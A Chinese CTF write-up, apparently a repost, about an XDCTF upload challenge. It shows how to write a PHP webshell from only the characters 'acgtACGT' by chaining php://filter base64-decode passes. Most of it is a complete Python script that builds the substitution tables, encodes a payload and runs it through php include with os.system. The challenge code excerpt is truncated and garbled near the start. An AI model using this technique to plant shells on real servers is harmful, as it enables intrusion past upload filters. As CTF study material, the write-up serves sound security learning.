# 【技术分享】XDCTF Upload引发出来的一个新思路
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[Lucifaer](http://bobao.360.cn/member/contribute?uid=2789273957)
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**前言**
在十一的XDCTF中有一道Upload题引出的如何通过固定的几个字符，利用php伪协议中的 **convert.base64-encode**
来写shell。
**  
**
**0x00 一道题引出的话题**
我们首先抛砖引玉，来看一下这道题的关键代码：
    = set(dict):
                break
        if flag:
            return tables
        return False
    if __name__ == '__main__':
        chars = 'acgtACGT'
        pprint(limited_exchanging(chars))
最后可以得到这样的映射表：
图很长，就不截了。
通过base64解码的特性，我们将8个字符拓展到了64个字符，接下来就是将我们的原数据进行转换就好了。
**  
**
**0x02 剩下的一些要注意的点**
1\. decode次数的问题
根据上面的代码，我们只需要len(tables)就可以知道我们转换经历了几次的过程，这边len(tables)是3次。
需要注意的是，在利用php://filter/convert.base64-decode/resource=的时候，需要len(tables) +
1，也就是说是4次，没毛病吧。
2\. 在利用我们得出的映射表时，怎么迭代向前替换问题
将tableslist从后向前遍历，最后得到的即为全部是指定字符的payload。
**  
**
**0x03 最终的脚本**
    import base64
    import string
    import os
    from itertools import product
    # base64基础64字符
    dict = string.ascii_letters + string.digits + "+/"
    # 得到payload完成base64编码后需要进行替换的向量
    def payload_base64_encode(data):
        return base64.b64encode(data).decode().replace("n", "").replace("=", "")
    # 利用可用字符替换其他字符
    def exchange(allow_chars):
        possible = list(product(allow_chars, repeat=4))
        table = {}
        for list_data in possible:
            data = "".join(list_data)
            decode_data = base64.b64decode(data)
            counter = 0
            t = 0
            for i in decode_data:
                j = chr(i)
                if j in dict:
                    counter += 1
                    t = j
            if counter == 1:
                table[t] = data
        return table
    # 迭代得出完整的映射表
    def limited_exchanging(allow_chars):
        tables = []
        saved_length = 0
        flag = True
        while True:
            table = exchange(allow_chars)
            length = len(table.keys())
            if saved_length == length:
                flag = False
                break
            saved_length = length
            print("[+] Got %d exchange_chars: %s" % (length, table.keys()))
            tables.append(table)
            allow_chars = table.keys()
            if set(table.keys()) >= set(dict):
                break
        if flag:
            return tables
        return False
    # 得到最后的payload
    def create_payload(tables, data):
        encoded = payload_base64_encode(data)
        print("[+] Payload base64: " + encoded)
        result = encoded
        for d in tables[::-1]:
            encoded = result
            result = ""
            for i in encoded:
                result += d[i]
        return result
    def main():
        payload = b""
        limit_chars = 'acgtACGT'
        filename = limit_chars
        tables = limited_exchanging(limit_chars)
        if tables:
            cipher = create_payload(tables, payload)
            with open(filename, "w") as f:
                f.write(cipher)
                print("[+] The encoded data is saved to file (%d Bytes) : %s" % (len(cipher), filename))
            command = "php -r 'include("" + "php://filter/convert.base64-decode/resource=" * (
                len(tables) + 1) + "%s");'" % (filename)
            print("[+] Usage : %s" % command)
            print("[+] Executing...")
            os.system(command=command)
        else:
            print("[-] Failed: %s" % tables)
    if __name__ == '__main__':
        main()
**0x04 总结**
这道题提出了一个比较好的思路，值得学习